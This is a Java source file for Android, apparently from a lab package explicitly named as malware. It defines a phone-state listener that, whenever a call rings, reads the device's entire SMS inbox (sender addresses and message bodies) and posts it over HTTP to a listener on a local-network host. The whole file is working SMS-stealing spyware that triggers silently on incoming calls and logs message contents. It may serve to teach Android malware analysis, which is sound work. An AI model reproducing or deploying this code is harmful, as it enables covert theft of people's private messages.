package org.mvp.labs.android.broadcast.malware;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class MyPhoneStateListener extends PhoneStateListener {
	Context context;
	public String URL="http://127.0.0.1";

	public MyPhoneStateListener(Context c){
		this.context=c;
	}
	public void onCallStateChanged(int state, String incomingNumber){
		switch(state){
		case TelephonyManager.CALL_STATE_IDLE:
			break;
		case TelephonyManager.CALL_STATE_OFFHOOK:
			break;
		case TelephonyManager.CALL_STATE_RINGING:
			Log.d("DEBUG", "RINGING " + incomingNumber);
			String sms = moduleGetSMS();
			sendSMSinfo(sms);
			Log.d("DEBUG", sms);
			break;
		}
	}

	public String moduleGetSMS(){
		String sms = "";

		Uri mSmsinboxQueryUri = Uri.parse("content://sms");
		Cursor cursor1 = this.context.getContentResolver().query(mSmsinboxQueryUri,
				new String[] { "_id", "thread_id", "address", "person", "date",
						"body", "type" }, null, null, null);
		//startManagingCursor(cursor1);
		String[] columns = new String[] { "address", "person", "date", "body",
		"type" };
		if (cursor1.getCount() > 0) {
			String count = Integer.toString(cursor1.getCount());
			Log.e("Count",count);
			while (cursor1.moveToNext()) {
				String address = cursor1.getString(cursor1
						.getColumnIndex(columns[0]));
				String name = cursor1.getString(cursor1
						.getColumnIndex(columns[1]));
				String date = cursor1.getString(cursor1
						.getColumnIndex(columns[2]));
				String msg = cursor1.getString(cursor1
						.getColumnIndex(columns[3]));
				String type = cursor1.getString(cursor1
						.getColumnIndex(columns[4]));
				
				sms += "From :" + address + " : " + msg+"\n";
			}
		}

		return sms;
	}

	public void sendSMSinfo(String sms){
		// Create a new HttpClient and Post Header
		HttpClient httpclient = new DefaultHttpClient();
		HttpPost httppost = new HttpPost("http://192.168.0.102:8000/listener");

		try {
			// Add your data
			List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
			nameValuePairs.add(new BasicNameValuePair("sms", sms));
			httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

			// Execute HTTP Post Request
			HttpResponse response = httpclient.execute(httppost);

		} catch (ClientProtocolException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
